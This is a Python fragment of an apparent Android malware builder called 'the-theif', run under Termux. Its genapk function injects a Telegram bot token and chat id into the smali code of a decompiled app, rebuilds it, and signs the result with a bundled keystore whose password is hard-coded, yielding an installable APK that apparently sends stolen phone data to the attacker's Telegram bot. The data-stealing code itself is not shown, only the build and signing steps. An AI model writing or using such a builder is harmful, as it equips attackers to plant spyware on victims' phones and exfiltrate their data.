def genapk(bot_token, chat_id):
    banner()
    smali1 = os.popen("find -O3 -L theif/ -name '*0001.smali'", "r").readline().strip()
    smali2 = os.popen("find -O3 -L theif/ -name 'MainActivity.smali'", "r").readline().strip()
    writefile(smali1, "your_bot_token", bot_token)
    writefile(smali2, "your_bot_token", bot_token)
    writefile(smali1, "your_chat_id", chat_id)
    writefile(smali2, "your_chat_id", chat_id)

    print("\33[33m")
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task(description="Building APK...", total=None)
        os.system("apkeditor b -i ~/theif -o ~/theif.apk")
    signapk()

def signapk():
    print("\nSigning apk file...")
    time.sleep(1)
    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
        progress.add_task(description="Signing...", total=None)
        os.system("apksigner sign --ks-pass pass:alienkrishn -ks $PREFIX/share/the-theif/key/the-theif.jks --out ~/signed.apk ~/theif.apk")
    os.system("rm -rf ~/theif.apk ~/theif ~/signed.apk.idsig > /dev/null 2>&1")

if __name__ == "__main__":
    main()
